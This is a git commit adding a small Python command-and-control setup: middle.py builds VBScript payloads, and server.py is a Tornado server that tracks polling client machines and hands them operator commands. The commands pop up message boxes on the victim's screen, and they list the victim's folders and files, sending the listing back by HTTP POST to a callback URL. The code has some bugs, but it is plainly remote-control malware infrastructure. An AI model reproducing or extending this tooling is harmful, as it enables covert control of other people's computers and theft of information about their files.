426eae84e563c5ed83bcf878c52baa42692a63cd
maxwell miller <maxwell miller>
2016-12-18 11:28:47 +0800

    init

---
+++ middle.py
@@ -0,0 +1,35 @@
+#coding=utf-8
+def add_sleep(origin, time):
+    try:
+        return "%sWScript.Sleep %d\n"%(origin, time)
+    except Exception(e) :
+        return origin+"WScript.Sleep 10000\n"
+
+def add_msgbox(origin, msg):
+    try:
+        return "%sMsgBox \"%s\"\n"%(origin, msg)
+    except Exception(e) :
+        return origin+"MsgBox \" \"\n"
+
+def add_post(origin, url, objn):
+    try:
+        return "%shttp.open \"POST\", \"%s\", False\n"%(origin, url) + \
+            "http.send %s"%objn
+    except Exception(e):
+        return origin
+
+def add_post_folder(origin, url, path):
+    try:
+        ret = "%sret=\"\"\n"%origin +\
+            "Set fso=CreateObject(\"Scripting.FileSystemObject\")\n" +\
+            "Set getfso=fso.GetFolder(\"%s\\\")\n"%path +\
+            "For Each subfoler in getfso.SubFolders\n" +\
+            "ret=ret&\"d-\"&subfoler.name&\",\"\nNext\n" +\
+            "For Each file in getfso.FiLes\n" +\
+            "ret=ret&\"f-\"&file.name&\",\"\nNext\n"
+        ret = add_post(ret, url, "ret")
+        return ret
+    except Exception(e):
+        print(e.message)
+        return origin
+
---
+++ server.py
@@ -0,0 +1,77 @@
+#coding=utf-8
+import tornado.ioloop
+import tornado.web
+import threading
+import queue
+from middle import *
+
+response = {
+    "resp": "",
+    "count": 0,
+    "default": add_sleep("", 1000),
+}
+
+clients = {
+    "ips": set(),
+}
+
+def ioInputTask():
+    tip = ""
+    while True:
+        a = input("cmd:")
+        if a.startswith("ips"):
+            print("-----------online client-----------")
+            print("\n".join(clients['ips']))
+            print("-----------online client end-------")
+        elif a.startswith("target"):
+            ip = a[7:]
+            tip = ip
+            print("chosen target ip %s"%tip)
+        elif a.startswith("ls"):
+            path = a[3:]
+            cmd = add_post_folder("", "http://127.0.0.1:8888/folder",path)
+            clients[tip].put(cmd)
+        elif a.startswith("msg"):
+            msg = a[4:]
+            cmd = add_msgbox("", msg)
+            clients[tip].put(cmd)
+
+class FileFolderHandler(tornado.web.RequestHandler):
+    def post(self):
+        print("-----------%sfolder-----------"%self.request.remote_ip)
+        print("%s"%( self.request.body.decode('utf-8')))
+        print("-----------%sfolder end-------"%self.request.remote_ip)
+        self.write("ok")
+
+class MainHandler(tornado.web.RequestHandler):
+    def get(self):
+        if self.request.remote_ip not in clients['ips']:
+            print("%s linked to host"%self.request.remote_ip)
+            clients['ips'].add(self.request.remote_ip)
+            clients[self.request.remote_ip] = queue.Queue(50)
+        else:
+            task_queue = clients[self.request.remote_ip]
+            if not task_queue.empty():
+                cmd = task_queue.get()
+                self.write(cmd)
+                task_queue.task_done()
+            else:
+                self.write(response['default'])
+    def post(self):
+        print("%s post %s"%(self.request.remote_ip, self.request.body.decode('utf-8')))
+        self.write("ok")
+
+def make_app():
+    return tornado.web.Application([
+    (r'/', MainHandler),
+    (r'/folder', MainHandler),
+    ])
+
+if __name__ == '__main__':
+    t1 = threading.Thread(target=ioInputTask)
+    t1.setDaemon(True)
+    t1.start()
+    app = make_app()
+    app.listen(8888)
+    print("looping")
+    tornado.ioloop.IOLoop.current().start()
